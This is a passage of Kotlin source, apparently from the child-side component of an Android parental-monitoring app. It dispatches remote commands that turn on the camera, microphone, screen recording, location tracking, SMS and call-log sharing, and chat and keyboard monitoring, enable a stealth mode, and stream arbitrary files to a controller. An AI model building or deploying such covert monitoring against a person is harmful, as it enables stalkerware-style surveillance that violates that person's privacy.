package nexus.android.child.commands

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat
import nexus.android.child.applock.AppLockManager
import nexus.android.child.commands.FileListRequest.Companion.DEFAULT_BATCH_SIZE
import nexus.android.child.commands.FileStreamRequest.Companion.DEFAULT_CHUNK_BYTES
import nexus.android.child.components.calllog.CallLogSharing
import nexus.android.child.components.camera.CameraController
import nexus.android.child.components.microphone.MicrophoneController
import nexus.android.child.components.sms.SmsSharing
import nexus.android.child.components.wallpaper.WallpaperController
import nexus.android.child.components.vibrateflash.VibrationFlashController
import org.webrtc.DataChannel
import kotlinx.coroutines.CoroutineScope

/**
 * Interface for handling commands from the parent application
 */
interface CommandHandler {
    /**
     * Handle a command string from the parent
     * @param cmd The command string to handle
     */
    fun handleCommand(cmd: String)
    
    /**
     * Send a message back to the parent via data channel
     * @param message The message to send
     */
    fun sendDataChannelMessage(message: String)
}

/**
 * Implementation of CommandHandler that can be used by both MainActivity and BackgroundService
 */
class CommandHandlerImpl(
    private val context: Context,
    private val dataChannel: DataChannel?,
    private val cameraController: CameraController?,
    private val microphoneController: MicrophoneController?,
    private val screenRecordingController: nexus.android.child.components.screen.ScreenRecordingController? = null,
    private val smsSharing: SmsSharing?,
    private val callLogSharing: CallLogSharing?,
    private val isBackgroundService: Boolean = false,
    private val permissionHandler: PermissionHandler? = null,
    private val stealthHandler: StealthHandler? = null,
    private val locationHandler: LocationHandler? = null,
    private val notificationHandler: NotificationHandler? = null,
    private val chatHandler: ChatHandler? = null,
    private val keyboardHandler: KeyboardHandler? = null,
    private val settingsHandler: SettingsHandler? = null,
    private val storageHandler: StorageHandler? = null,
    private val parentVoiceHandler: ParentVoiceHandler? = null,
    val wallpaperController: WallpaperController? = null,
    private val vibrationFlashController: VibrationFlashController? = null,
    private val coroutineScope: CoroutineScope? = null,
    private val onRenegotiationNeeded: ((onComplete: () -> Unit) -> Unit)? = null
) : CommandHandler {

    override fun handleCommand(cmd: String) {
        try {
            // Try to parse as JSON
            val json = try { org.json.JSONObject(cmd) } catch (_: Exception) { null }
            val command = json?.optString("cmd") ?: cmd.trim()
            val since = json?.optLong("since", 0L) ?: 0L

            when (command) {
                // Camera Commands
                "CAMERA_ON" -> handleCameraOn()
                "CAMERA_OFF" -> handleCameraOff()
                "CAMERA_SWITCH" -> handleCameraSwitch()
                
                // Microphone Commands
                "MIC_ON" -> handleMicOn()
                "MIC_OFF" -> handleMicOff()
                
                // Screen Recording Commands
                "SCREEN_RECORDING_ON" -> handleScreenRecordingOn()
                "SCREEN_RECORDING_OFF" -> handleScreenRecordingOff()

                // Location Commands
                "LOCATE_CHILD" -> handleLocateChild()
                "LOCATE_CHILD_STOP" -> handleLocateChildStop()
                
                // SMS Commands
                "SMS_ON" -> handleSmsOn(since)
                "SMS_OFF" -> handleSmsOff()
                
                // Call Log Commands
                "CALLLOG_ON" -> handleCallLogOn(since)
                "CALLLOG_OFF" -> handleCallLogOff()
                
                // Notification Commands
                "NOTIFICATION_ON" -> handleNotificationOn()
                "NOTIFICATION_OFF" -> handleNotificationOff()
                
                // Chat Commands
                "CHAT_ON" -> handleChatOn()
                "CHAT_OFF" -> handleChatOff()
                
                // Keyboard Commands
                "KEYBOARD_ON" -> handleKeyboardOn()
                "KEYBOARD_OFF" -> handleKeyboardOff()
                
                // Stealth Commands
                "STEALTH_ON" -> handleStealthOn()
                "STEALTH_OFF" -> handleStealthOff()

                // Settings Commands
                "OPEN_SETTINGS" -> handleOpenSettings()
                "CHECK_PERMISSIONS" -> handleCheckPermissions()
                "REQUEST_ALL_PERMISSIONS" -> handleRequestAllPermissions()
                "SHOW_PERMISSION_DIALOG" -> handleShowPermissionDialog(cmd)

                // Storage Commands
                "LIST_FILES" -> handleListFiles(json, cmd)
                "GET_FILE" -> handleGetFile(json, cmd)
                "GET_FILE_PROGRESSIVE" -> handleGetFileProgressive(json, cmd)
                "STOP_STREAM" -> handleStopStream(json, cmd)
                
                // Digital Wellbeing Commands
                "GET_WELLBEING" -> handleGetWellbeing()
                "STOP_WELLBEING" -> handleStopWellbeing()
                
                // Parent Audio Commands
                "PARENT_AUDIO_UNMUTE" -> handleParentAudioUnmute()
                "PARENT_AUDIO_MUTE" -> handleParentAudioMute()
                
                // Wallpaper Commands
                "SET_WALLPAPER" -> handleSetWallpaper(json)
                
                // Vibration and Flash Commands
                "VIBRATE" -> handleVibrate(json)
                "FLASH" -> handleFlash(json)
                "VIBRATE_FLASH" -> handleVibrateFlash(json)
                
                // App Lock Commands
                "SET_APP_LOCK_PIN" -> handleSetAppLockPin(json)
                "SET_APP_LOCK_ENABLED" -> handleSetAppLockEnabled(json)
                "GET_APP_LOCK_STATUS" -> handleGetAppLockStatus()
                
                else -> {
                    Log.w("CommandHandler", "Unknown command: $cmd")
                    sendDataChannelMessage("UNKNOWN_COMMAND: $cmd")
                }
            }
        } catch (e: Exception) {
            Log.e("CommandHandler", "Unexpected error handling command: $cmd", e)
            sendDataChannelMessage("COMMAND_ERROR: ${e.message}")
        }
    }

    override fun sendDataChannelMessage(message: String) {
        try {
            if (dataChannel?.state() == DataChannel.State.OPEN) {
                val buffer = DataChannel.Buffer(
                    java.nio.ByteBuffer.wrap(message.toByteArray(Charsets.UTF_8)),
                    false
                )
                dataChannel.send(buffer)
                Log.d("DataChannel", "Sent message: $message")
            } else {
                Log.w("DataChannel", "Cannot send message, channel state: ${dataChannel?.state()}")
            }
        } catch (e: Exception) {
            Log.e("DataChannel", "Failed to send message: $message", e)
        }
    }

    // Camera Command Handlers
    private fun handleCameraOn() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                cameraController?.startCamera()
                sendDataChannelMessage("CAMERA_STARTED")
                Log.d("CommandHandler", "Camera started successfully")
            } catch (e: Exception) {
                Log.e("CommandHandler", "Failed to start camera", e)
                sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
            }
        } else {
            if (isBackgroundService) {
                sendDataChannelMessage("CAMERA_PERMISSION_NEEDS_SETTINGS")
                Log.w("CommandHandler", "Camera permission not granted")
            } else {
                permissionHandler?.requestPermission(Manifest.permission.CAMERA, 1001, "Camera")
                sendDataChannelMessage("CAMERA_PERMISSION_REQUESTED")
            }
        }
    }

    private fun handleCameraOff() {
        try {
            cameraController?.stopCamera()
            sendDataChannelMessage("CAMERA_STOPPED")
            Log.d("CommandHandler", "Camera stopped successfully")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop camera", e)
            sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
        }
    }

    private fun handleCameraSwitch() {
        try {
            cameraController?.switchCamera()
            sendDataChannelMessage("CAMERA_SWITCHED")
            Log.d("CommandHandler", "Camera switched successfully")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to switch camera", e)
            sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
        }
    }

    // Microphone Command Handlers
    private fun handleMicOn() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
            == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                // Start microphone (adds track to PeerConnection)
                val needsRenegotiation = microphoneController?.startMicrophone() ?: false
                
                if (needsRenegotiation) {
                    // Trigger renegotiation, send confirmation after it completes
                    onRenegotiationNeeded?.invoke {
                        sendDataChannelMessage("MIC_STARTED")
                        Log.d("CommandHandler", "✅ Microphone started (after renegotiation)")
                    }
                } else {
                    Log.w("CommandHandler", "⚠️ Microphone start failed or already active")
                }
            } catch (e: Exception) {
                Log.e("CommandHandler", "Failed to start microphone", e)
                sendDataChannelMessage("MIC_ERROR: ${e.message}")
            }
        } else {
            if (isBackgroundService) {
                sendDataChannelMessage("MIC_PERMISSION_NEEDS_SETTINGS")
                Log.w("CommandHandler", "Microphone permission not granted")
            } else {
                permissionHandler?.requestPermission(Manifest.permission.RECORD_AUDIO, 1002, "Microphone")
                sendDataChannelMessage("MIC_PERMISSION_REQUESTED")
            }
        }
    }

    private fun handleMicOff() {
        try {
            // Stop microphone (disposes track, then removes from PeerConnection)
            val needsRenegotiation = microphoneController?.stopMicrophone() ?: false
            
            if (needsRenegotiation) {
                // Trigger renegotiation, send confirmation after it completes
                onRenegotiationNeeded?.invoke {
                    sendDataChannelMessage("MIC_STOPPED")
                    Log.d("CommandHandler", "✅ Microphone stopped (after renegotiation)")
                }
            } else {
                Log.w("CommandHandler", "⚠️ Microphone stop failed or already inactive")
            }
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop microphone", e)
            sendDataChannelMessage("MIC_ERROR: ${e.message}")
        }
    }
    
    // Screen Recording Command Handlers
    private fun handleScreenRecordingOn() {
        try {
            // Launch transparent activity to request MediaProjection permission
            // Activity will broadcast result back to BackgroundService
            // BackgroundService will handle the result and start screen recording
            nexus.android.child.components.screen.TransparentMediaProjectionActivity.launch(context)
            Log.d("CommandHandler", "🖥️ Launching MediaProjection permission activity")
            
            // Note: Confirmation (SCREEN_RECORDING_STARTED) will be sent after:
            // 1. Permission granted
            // 2. Screen recording started
            // 3. Renegotiation completed
            
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to launch MediaProjection activity", e)
            sendDataChannelMessage("SCREEN_RECORDING_ERROR: ${e.message}")
        }
    }
    
    private fun handleScreenRecordingOff() {
        try {
            // Stop screen recording (disposes track, then removes from PeerConnection)
            val needsRenegotiation = screenRecordingController?.stopScreenRecording() ?: false
            
            if (needsRenegotiation) {
                // Trigger renegotiation, send confirmation after it completes
                onRenegotiationNeeded?.invoke {
                    sendDataChannelMessage("SCREEN_RECORDING_STOPPED")
                    Log.d("CommandHandler", "✅ Screen recording stopped (after renegotiation)")
                }
            } else {
                Log.w("CommandHandler", "⚠️ Screen recording stop failed or already inactive")
            }
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop screen recording", e)
            sendDataChannelMessage("SCREEN_RECORDING_ERROR: ${e.message}")
        }
    }

    // Location Command Handlers
    private fun handleLocateChild() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
            == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                locationHandler?.startLocationTracking()
                sendDataChannelMessage("LOCATION_STARTED")
                Log.d("CommandHandler", "Location tracking started successfully")
            } catch (e: Exception) {
                Log.e("CommandHandler", "Failed to start location tracking", e)
                sendDataChannelMessage("LOCATION_ERROR: ${e.message}")
            }
        } else {
            if (isBackgroundService) {
                sendDataChannelMessage("LOCATION_PERMISSION_NEEDS_SETTINGS")
                Log.w("CommandHandler", "Location permission not granted")
            } else {
                permissionHandler?.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION, 1004, "Location")
                sendDataChannelMessage("LOCATION_PERMISSION_REQUESTED")
            }
        }
    }

    private fun handleLocateChildStop() {
        try {
            locationHandler?.stopLocationTracking()
            sendDataChannelMessage("LOCATION_STOPPED")
            Log.d("CommandHandler", "Location tracking stopped successfully")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop location tracking", e)
            sendDataChannelMessage("LOCATION_ERROR: ${e.message}")
        }
    }

    // SMS Command Handlers
    private fun handleSmsOn(since: Long) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                smsSharing?.startSharing()
                sendDataChannelMessage("SMS_STARTED")
                Log.d("CommandHandler", "SMS sharing started (since=$since)")
            } catch (e: Exception) {
                Log.e("CommandHandler", "Failed to start SMS sharing", e)
                sendDataChannelMessage("SMS_ERROR: ${e.message}")
            }
        } else {
            if (isBackgroundService) {
                sendDataChannelMessage("SMS_PERMISSION_REQUESTED")
                Log.d("CommandHandler", "Requested READ_SMS permission")
            } else {
                permissionHandler?.requestPermission(Manifest.permission.READ_SMS, 1005, "SMS")
                sendDataChannelMessage("SMS_PERMISSION_REQUESTED")
                Log.d("CommandHandler", "Requested READ_SMS permission")
            }
        }
    }

    private fun handleSmsOff() {
        if (smsSharing == null) {
            Log.w("CommandHandler", "Tried to stop SMS sharing but it was never started.")
        }
        try {
            smsSharing?.stopSharing()
            sendDataChannelMessage("SMS_STOPPED")
            Log.d("CommandHandler", "SMS sharing stopped")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop SMS sharing", e)
            sendDataChannelMessage("SMS_ERROR: ${e.message}")
        }
    }

    // Call Log Command Handlers
    private fun handleCallLogOn(since: Long) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
            == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                callLogSharing?.startSharing()
                sendDataChannelMessage("CALLLOG_STARTED")
                Log.d("CommandHandler", "Call log sharing started (since=$since)")
            } catch (e: Exception) {
                Log.e("CommandHandler", "Failed to start call log sharing", e)
                sendDataChannelMessage("CALLLOG_ERROR: ${e.message}")
            }
        } else {
            if (isBackgroundService) {
                sendDataChannelMessage("CALLLOG_PERMISSION_REQUESTED")
                Log.d("CommandHandler", "Requested READ_CALL_LOG permission")
            } else {
                permissionHandler?.requestPermission(Manifest.permission.READ_CALL_LOG, 1006, "Call Log")
                sendDataChannelMessage("CALLLOG_PERMISSION_REQUESTED")
                Log.d("CommandHandler", "Requested READ_CALL_LOG permission")
            }
        }
    }

    private fun handleCallLogOff() {
        if (callLogSharing == null) {
            Log.w("CommandHandler", "Tried to stop call log sharing but it was never started.")
        }
        try {
            callLogSharing?.stopSharing()
            sendDataChannelMessage("CALLLOG_STOPPED")
            Log.d("CommandHandler", "Call log sharing stopped")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop call log sharing", e)
            sendDataChannelMessage("CALLLOG_ERROR: ${e.message}")
        }
    }

    // Notification Command Handlers
    private fun handleNotificationOn() {
        try {
            notificationHandler?.startNotificationSharing()
            sendDataChannelMessage("NOTIFICATION_STARTED")
            Log.d("CommandHandler", "Notification sharing started")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to start notification sharing", e)
            sendDataChannelMessage("NOTIFICATION_ERROR: ${e.message}")
        }
    }

    private fun handleNotificationOff() {
        try {
            notificationHandler?.stopNotificationSharing()
            sendDataChannelMessage("NOTIFICATION_STOPPED")
            Log.d("CommandHandler", "Notification sharing stopped")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop notification sharing", e)
            sendDataChannelMessage("NOTIFICATION_ERROR: ${e.message}")
        }
    }

    // Chat Command Handlers
    private fun handleChatOn() {
        try {
            chatHandler?.startChatMonitoring()
            sendDataChannelMessage("CHAT_STARTED")
            Log.d("CommandHandler", "Chat monitoring started")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to start chat monitoring", e)
            sendDataChannelMessage("CHAT_ERROR: ${e.message}")
        }
    }

    private fun handleChatOff() {
        try {
            chatHandler?.stopChatMonitoring()
            sendDataChannelMessage("CHAT_STOPPED")
            Log.d("CommandHandler", "Chat monitoring stopped")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop chat monitoring", e)
            sendDataChannelMessage("CHAT_ERROR: ${e.message}")
        }
    }

    // Keyboard Command Handlers
    private fun handleKeyboardOn() {
        try {
            keyboardHandler?.startKeyboardMonitoring()
            sendDataChannelMessage("KEYBOARD_STARTED")
            Log.d("CommandHandler", "Keyboard monitoring started")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to start keyboard monitoring", e)
            sendDataChannelMessage("KEYBOARD_ERROR: ${e.message}")
        }
    }

    private fun handleKeyboardOff() {
        try {
            keyboardHandler?.stopKeyboardMonitoring()
            sendDataChannelMessage("KEYBOARD_STOPPED")
            Log.d("CommandHandler", "Keyboard monitoring stopped")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop keyboard monitoring", e)
            sendDataChannelMessage("KEYBOARD_ERROR: ${e.message}")
        }
    }

    // Stealth Command Handlers
    private fun handleStealthOn() {
        stealthHandler?.activateStealthMode()
        sendDataChannelMessage("STEALTH_ON_ACK")
        Log.d("CommandHandler", "Stealth mode activated")
    }

    private fun handleStealthOff() {
        stealthHandler?.deactivateStealthMode()
        sendDataChannelMessage("STEALTH_OFF_ACK")
        Log.d("CommandHandler", "Stealth mode deactivated")
    }

    // Settings Command Handlers
    private fun handleOpenSettings() {
        settingsHandler?.openAppSettings()
        sendDataChannelMessage("SETTINGS_OPENED")
        Log.d("CommandHandler", "Opening app settings")
    }

    private fun handleCheckPermissions() {
        // Delegate to context-specific handler so the host (Activity/Service)
        // can decide how to compute and send results.
        settingsHandler?.checkPermissionStatus()
        Log.d("CommandHandler", "Checking permission status via settings handler")
    }

    private fun handleRequestAllPermissions() {
        settingsHandler?.requestAllPermissions()
        sendDataChannelMessage("ALL_PERMISSIONS_REQUESTED")
        Log.d("CommandHandler", "Requesting all permissions again")
    }

    private fun handleShowPermissionDialog(cmd: String) {
        val featureName = cmd.split(":")[1].ifEmpty { "Unknown" }
        settingsHandler?.showPermissionSettingsDialog(featureName)
        sendDataChannelMessage("PERMISSION_DIALOG_SHOWN")
        Log.d("CommandHandler", "Showing permission dialog for: $featureName")
    }

    private fun handleListFiles(payload: org.json.JSONObject?, rawCmd: String) {
        // If there's a parsed JSON object, prefer its path field directly; only fall back to legacy parsing if no payload
        var directory: String?
        var includeHidden: Boolean
        var batchSize: Int
        var pageToken: String?
        var requestId: String?

        if (payload != null) {
            directory = payload.optString("path").takeIf { !it.isNullOrBlank() }
            includeHidden = payload.optBoolean("include_hidden", false)
            batchSize = payload.optInt("batch_size").takeIf { it > 0 } ?: DEFAULT_BATCH_SIZE
            pageToken = payload.optString("page_token").takeIf { !it.isNullOrBlank() }
            requestId = payload.optString("request_id").takeIf { !it.isNullOrBlank() }
        } else {
            val legacyArgs = parseLegacyArgs(rawCmd)
            directory = legacyArgs.path
            includeHidden = legacyArgs.query["include_hidden"]?.toBoolean() ?: false
            batchSize = legacyArgs.query["batch_size"]?.toIntOrNull() ?: DEFAULT_BATCH_SIZE
            pageToken = legacyArgs.query["page_token"]
            requestId = legacyArgs.query["request_id"]
        }

        if (storageHandler == null) {
            sendDataChannelMessage("""{"type":"LIST_FILES_ERROR","reason":"UNSUPPORTED"}""")
            return
        }
        storageHandler.listFiles(
            FileListRequest(
                directoryPath = directory,
                includeHidden = includeHidden,
                batchSize = batchSize,
                pageToken = pageToken,
                requestId = requestId
            )
        )
    }

    private fun handleGetFile(payload: org.json.JSONObject?, rawCmd: String) {
        val legacyArgs = parseLegacyArgs(rawCmd)
        val absolutePath = payload?.optString("path")?.takeIf { it.isNotBlank() }
            ?: legacyArgs.path

        if (absolutePath.isNullOrBlank()) {
            sendDataChannelMessage("""{"type":"FILE_TRANSFER_ERROR","reason":"MISSING_PATH"}""")
            return
        }

        val resumeOffset = payload?.optLong("resume_offset")
            ?: legacyArgs.query["offset"]?.toLongOrNull()
            ?: 0L
        val chunkSize = payload?.optInt("chunk_size")?.takeIf { it > 0 }
            ?: legacyArgs.query["chunk_size"]?.toIntOrNull()
            ?: DEFAULT_CHUNK_BYTES
        val requestId = payload?.optString("request_id")?.takeIf { it.isNotBlank() }
            ?: legacyArgs.query["request_id"]
        val transferId = payload?.optString("transfer_id")?.takeIf { it.isNotBlank() }
            ?: legacyArgs.query["transfer_id"]

        if (storageHandler == null) {
            sendDataChannelMessage("""{"type":"FILE_TRANSFER_ERROR","reason":"UNSUPPORTED"}""")
            return
        }

        storageHandler.streamFile(
            FileStreamRequest(
                absolutePath = absolutePath,
                resumeOffset = resumeOffset,
                chunkSizeBytes = chunkSize,
                requestId = requestId,
                transferId = transferId
            )
        )
    }

    private fun handleGetFileProgressive(payload: org.json.JSONObject?, rawCmd: String) {
        val legacyArgs = parseLegacyArgs(rawCmd)
        val absolutePath = payload?.optString("path")?.takeIf { it.isNotBlank() }
            ?: legacyArgs.path

        if (absolutePath.isNullOrBlank()) {
            sendDataChannelMessage("""{"type":"FILE_TRANSFER_ERROR","reason":"MISSING_PATH"}""")
            return
        }

        val resumeOffset = payload?.optLong("resume_offset")
            ?: legacyArgs.query["offset"]?.toLongOrNull()
            ?: 0L
        // Use smaller chunks for progressive streaming (default 32KB)
        val chunkSize = payload?.optInt("chunk_size")?.takeIf { it > 0 }
            ?: legacyArgs.query["chunk_size"]?.toIntOrNull()
            ?: (32 * 1024) // 32KB default for progressive
        val requestId = payload?.optString("request_id")?.takeIf { it.isNotBlank() }
            ?: legacyArgs.query["request_id"]
        val transferId = payload?.optString("transfer_id")?.takeIf { it.isNotBlank() }
            ?: legacyArgs.query["transfer_id"]
        val streamId = payload?.optString("stream_id")?.takeIf { it.isNotBlank() }
            ?: legacyArgs.query["stream_id"]

        if (storageHandler == null) {
            sendDataChannelMessage("""{"type":"FILE_TRANSFER_ERROR","reason":"UNSUPPORTED"}""")
            return
        }

        Log.d("CommandHandler", "Starting progressive file stream: $absolutePath, chunkSize: $chunkSize")

        // Use the FileSystemController's progressive streaming method
        val fileSystemController = storageHandler as? nexus.android.child.components.storage.FileSystemController
        if (fileSystemController != null) {
            fileSystemController.streamFileProgressive(
                FileStreamRequest(
                    absolutePath = absolutePath,
                    resumeOffset = resumeOffset,
                    chunkSizeBytes = chunkSize,
                    requestId = requestId,
                    transferId = transferId
                )
            )
        } else {
            // Fallback to regular streaming if progressive is not available
            Log.w("CommandHandler", "Progressive streaming not available, falling back to regular streaming")
            storageHandler.streamFile(
                FileStreamRequest(
                    absolutePath = absolutePath,
                    resumeOffset = resumeOffset,
                    chunkSizeBytes = chunkSize,
                    requestId = requestId,
                    transferId = transferId
                )
            )
        }
    }

    private fun handleStopStream(payload: org.json.JSONObject?, rawCmd: String) {
        val transferId = payload?.optString("transfer_id")?.takeIf { it.isNotBlank() }
            ?: parseLegacyArgs(rawCmd).query["transfer_id"]

        if (transferId.isNullOrBlank()) {
            Log.w("CommandHandler", "STOP_STREAM command missing transfer_id")
            sendDataChannelMessage("""{"type":"STREAM_STOP_ERROR","reason":"MISSING_TRANSFER_ID"}""")
            return
        }

        if (storageHandler == null) {
            sendDataChannelMessage("""{"type":"STREAM_STOP_ERROR","reason":"UNSUPPORTED"}""")
            return
        }

        Log.d("CommandHandler", "Stopping stream with transfer_id: $transferId")

        // Use the FileSystemController's stop streaming method
        val fileSystemController = storageHandler as? nexus.android.child.components.storage.FileSystemController
        if (fileSystemController != null) {
            val success = fileSystemController.stopStream(transferId)
            if (success) {
                sendDataChannelMessage("""{"type":"STREAM_STOPPED","transfer_id":"$transferId"}""")
                Log.d("CommandHandler", "Successfully stopped stream: $transferId")
            } else {
                sendDataChannelMessage("""{"type":"STREAM_STOP_ERROR","transfer_id":"$transferId","reason":"STREAM_NOT_FOUND"}""")
                Log.w("CommandHandler", "Stream not found or already stopped: $transferId")
            }
        } else {
            sendDataChannelMessage("""{"type":"STREAM_STOP_ERROR","reason":"CONTROLLER_UNAVAILABLE"}""")
            Log.e("CommandHandler", "FileSystemController not available for stopping stream")
        }
    }

    /**
     * Handle GET_WELLBEING command - collect and send digital wellbeing data
     */
    private fun handleGetWellbeing() {
        try {

            // Check permission
            if (ContextCompat.checkSelfPermission(
                    context,
                    Manifest.permission.PACKAGE_USAGE_STATS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                sendDataChannelMessage("""{"type":"WELLBEING_ERROR","reason":"PERMISSION_DENIED"}""")
                Log.w("CommandHandler", "PACKAGE_USAGE_STATS permission not granted")
                return
            }

            // Collect wellbeing data
            val collector = nexus.android.child.components.wellbeing.DigitalWellbeingCollector(context)
            val wellbeingData = collector.getWellbeingData()

            // Send data to parent
            sendDataChannelMessage(wellbeingData.toString())
            Log.d("CommandHandler", "Wellbeing data sent successfully")

        } catch (e: Exception) {
            Log.e("CommandHandler", "Error collecting wellbeing data", e)
            sendDataChannelMessage("""{"type":"WELLBEING_ERROR","reason":"${e.message}"}""")
        }
    }

    /**
     * Handle STOP_WELLBEING command
     */
    private fun handleStopWellbeing() {
        Log.d("CommandHandler", "Wellbeing monitoring stopped")
        sendDataChannelMessage("""{"type":"WELLBEING_STOPPED"}""")
    }

    /**
     * Handle PARENT_AUDIO_UNMUTE command - increase volume when parent unmutes
     */
    private fun handleParentAudioUnmute() {
        try {
            parentVoiceHandler?.startReceivingVoice()
            sendDataChannelMessage("PARENT_AUDIO_UNMUTED")
            Log.d("CommandHandler", "🔊 Parent audio unmuted - volume increased")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to handle parent audio unmute", e)
            sendDataChannelMessage("PARENT_AUDIO_ERROR: ${e.message}")
        }
    }

    /**
     * Handle PARENT_AUDIO_MUTE command - restore volume when parent mutes
     */
    private fun handleParentAudioMute() {
        try {
            parentVoiceHandler?.stopReceivingVoice()
            sendDataChannelMessage("PARENT_AUDIO_MUTED")
            Log.d("CommandHandler", "🔇 Parent audio muted - volume restored")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to handle parent audio mute", e)
            sendDataChannelMessage("PARENT_AUDIO_ERROR: ${e.message}")
        }
    }

    /**
     * Handle SET_WALLPAPER command - receive and set wallpaper image
     */
    private fun handleSetWallpaper(json: org.json.JSONObject?) {
        if (wallpaperController == null) {
            Log.e("CommandHandler", "WallpaperController not available")
            sendDataChannelMessage("WALLPAPER_ERROR: Controller not available")
            return
        }

        try {
            if (json != null) {
                // This is the command header with metadata
                val size = json.optLong("size", 0L)
                val filename = json.optString("filename", "wallpaper.jpg")
                
                if (size <= 0) {
                    Log.e("CommandHandler", "Invalid wallpaper size: $size")
                    sendDataChannelMessage("WALLPAPER_ERROR: Invalid size")
                    return
                }
                
                Log.d("CommandHandler", "Starting wallpaper receive: $filename, $size bytes")
                wallpaperController.startReceivingWallpaper(size, filename)
                sendDataChannelMessage("WALLPAPER_RECEIVING")
            }
        } catch (e: Exception) {
            Log.e("CommandHandler", "Error handling SET_WALLPAPER command", e)
            sendDataChannelMessage("WALLPAPER_ERROR: ${e.message}")
        }
    }

    /**
     * Handle binary wallpaper data chunk
     * @param data Binary data chunk
     */
    fun handleWallpaperData(data: ByteArray) {
        if (wallpaperController == null || !wallpaperController.isReceivingWallpaper()) {
            return
        }

        try {
            val isComplete = wallpaperController.receiveWallpaperChunk(data)
            
            if (isComplete) {
                // All data received, now set the wallpaper
                val success = wallpaperController.setWallpaper()
                
                if (success) {
                    sendDataChannelMessage("WALLPAPER_SET_SUCCESS")
                    Log.d("CommandHandler", "✅ Wallpaper set successfully")
                } else {
                    sendDataChannelMessage("WALLPAPER_SET_FAILED")
                    Log.e("CommandHandler", "❌ Failed to set wallpaper")
                }
            }
        } catch (e: Exception) {
            Log.e("CommandHandler", "Error handling wallpaper data", e)
            sendDataChannelMessage("WALLPAPER_ERROR: ${e.message}")
            wallpaperController.cancelWallpaperReceive()
        }
    }

    /**
     * Handle VIBRATE command - execute vibration pattern
     */
    private fun handleVibrate(json: org.json.JSONObject?) {
        if (vibrationFlashController == null) {
            Log.e("CommandHandler", "VibrationFlashController not available")
            sendDataChannelMessage("VIBRATE_FAILED: Controller not available")
            return
        }

        try {
            val pattern = json?.optString("pattern", "short") ?: "short"
            Log.d("CommandHandler", "Executing vibration pattern: $pattern")
            
            val success = vibrationFlashController.vibrate(pattern)
            
            if (success) {
                sendDataChannelMessage("VIBRATE_SUCCESS: $pattern")
                Log.d("CommandHandler", "✅ Vibration pattern executed: $pattern")
            } else {
                sendDataChannelMessage("VIBRATE_FAILED: $pattern")
                Log.e("CommandHandler", "❌ Failed to execute vibration pattern: $pattern")
            }
        } catch (e: Exception) {
            Log.e("CommandHandler", "Error handling VIBRATE command", e)
            sendDataChannelMessage("VIBRATE_FAILED: ${e.message}")
        }
    }

    /**
     * Handle FLASH command - execute flash pattern
     */
    private fun handleFlash(json: org.json.JSONObject?) {
        if (vibrationFlashController == null || coroutineScope == null) {
            Log.e("CommandHandler", "VibrationFlashController or CoroutineScope not available")
            sendDataChannelMessage("FLASH_FAILED: Controller not available")
            return
        }

        try {
            val pattern = json?.optString("pattern", "blink") ?: "blink"
            Log.d("CommandHandler", "Executing flash pattern: $pattern")
            
            val success = vibrationFlashController.flash(pattern, coroutineScope)
            
            if (success) {
                sendDataChannelMessage("FLASH_SUCCESS: $pattern")
                Log.d("CommandHandler", "✅ Flash pattern executed: $pattern")
            } else {
                sendDataChannelMessage("FLASH_FAILED: $pattern")
                Log.e("CommandHandler", "❌ Failed to execute flash pattern: $pattern")
            }
        } catch (e: Exception) {
            Log.e("CommandHandler", "Error handling FLASH command", e)
            sendDataChannelMessage("FLASH_FAILED: ${e.message}")
        }
    }

    /**
     * Handle VIBRATE_FLASH command - execute combined pattern
     */
    private fun handleVibrateFlash(json: org.json.JSONObject?) {
        if (vibrationFlashController == null || coroutineScope == null) {
            Log.e("CommandHandler", "VibrationFlashController or CoroutineScope not available")
            sendDataChannelMessage("VIBRATE_FLASH_FAILED: Controller not available")
            return
        }

        try {
            val pattern = json?.optString("pattern", "alert") ?: "alert"
            Log.d("CommandHandler", "Executing combined pattern: $pattern")
            
            val success = vibrationFlashController.vibrateAndFlash(pattern, coroutineScope)
            
            if (success) {
                sendDataChannelMessage("VIBRATE_FLASH_SUCCESS: $pattern")
                Log.d("CommandHandler", "✅ Combined pattern executed: $pattern")
            } else {
                sendDataChannelMessage("VIBRATE_FLASH_FAILED: $pattern")
                Log.e("CommandHandler", "❌ Failed to execute combined pattern: $pattern")
            }
        } catch (e: Exception) {
            Log.e("CommandHandler", "Error handling VIBRATE_FLASH command", e)
            sendDataChannelMessage("VIBRATE_FLASH_FAILED: ${e.message}")
        }
    }

    private data class LegacyArgs(
        val path: String?,
        val query: Map<String, String>
    )

    private fun parseLegacyArgs(command: String): LegacyArgs {
        val idx = command.indexOf(":")
